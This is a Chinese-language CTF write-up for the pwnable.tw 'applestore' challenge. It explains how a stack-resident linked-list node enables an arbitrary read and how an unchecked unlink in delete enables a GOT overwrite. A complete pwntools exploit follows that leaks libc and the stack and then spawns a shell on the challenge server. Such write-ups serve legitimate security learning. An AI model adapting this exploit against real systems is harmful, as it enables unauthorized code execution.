# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> 泄漏`libc`地址 -> 泄漏栈地址 -> 通过指针操作修改`got`表 -> 执行`system('&system_addr;/bin/sh\x00')`

mycart是一个链表，第一个块是空的。`handler`包括`list`、`add`、`delete`、`cart`、`checkout`等函数。如果`checkout`能够1元购机时即总额达到`7174`，会在链表末尾增加一个新块，但这个块地址在栈上，由于`checkout`和`cart`函数内部栈结构相同，因此在`cart`中从`buf[2]`开始的内容会覆盖这个块。块结构如下，因此可以利用`cart`通过修改`name_addr`造成任意地址泄露。

```
            ---------------
            |    last     |
            ---------------
            |    next     |
            ---------------
            |    price    |
            ---------------
            |  name_addr  |
buf[2]->    ---------------
```

由于`delete`内部处理和linux堆管理中`free`类似，就是链表删除节点操作，但没有进行检查，因此存在漏洞。如果`next = addr - 0x0c`，那么`*addr = *last`。同理如果`last = addr - 0x08`，那么`*addr = *next`。因为可以控制`atoi`传入参数，而`my_read`向`nptr`即`[ebp - 0x22]`读入值，因此考虑修改`ebp`成`got['atoi'] - 0x22`，这样能够直接修改`atoi`的`got`表中的值为`system`的地址，从而`get shell`。


> hint:
> 1. 由于存在指针操作，注意将next和last赋值准确，避免abort，gdb容易在出现错误前崩溃
> 2. 泄漏`libc`地址之后可以通过泄漏`environ`获得栈地址
> 3. 因为`libc`不可写，因此没有直接修改`got['atoi'] = &system`，因为另一个指针操作会修改system内容。


# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

elf = ELF('applestore.dms')

if DEBUG:
    p = process('applestore.dms')
    gdb.attach(p)
    libc = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10104)
    libc = ELF('libc_32.so.6')

def additem(id):
    p.recvuntil('> ')
    p.send('2')
    p.recvuntil('Device Number> ')
    p.send(str(id))

def deleteitem(id):
    p.recvuntil('> ')
    p.send('3')
    p.recvuntil('Item Number> ')
    p.send(str(id))

def cart(content):
    p.recvuntil('> ')
    p.send('4')
    p.recvuntil('Let me check your cart. ok? (y/n) > ')
    p.send(content)

def checkout():
    p.recvuntil('> ')
    p.send('5')
    p.recvuntil('Let me check your cart. ok? (y/n) > ')
    p.send('y')

def leakaddr(addr, num):
    cart('yy' + p32(addr) + p32(1) + p32(0) * 2)
    p.recvuntil('%d: ' % num)
    return u32(p.recv(4))

def change(addr, nextptr, lastptr, num):
    deleteitem(str(num) + p32(addr) + p32(1) + p32(nextptr) + p32(lastptr))

l = [6, 20, 0, 0, 0]

for id, i in enumerate(l):
    for j in range(i):
        additem(id + 1)

s = sum(l) + 1

checkout()

libc_addr = leakaddr(elf.got['puts'], s) - libc.symbols['puts']
stack_addr = leakaddr(libc_addr + libc.symbols['environ'], s)
system_addr = libc_addr + libc.symbols['system']
atoi_addr = libc_addr + libc.symbols['atoi']
change(libc_addr, stack_addr - 0x104 -0xc, elf.got['atoi'] + 0x22, s)
p.send(p32(system_addr) + ';/bin/sh\x00')
p.interactive()
```
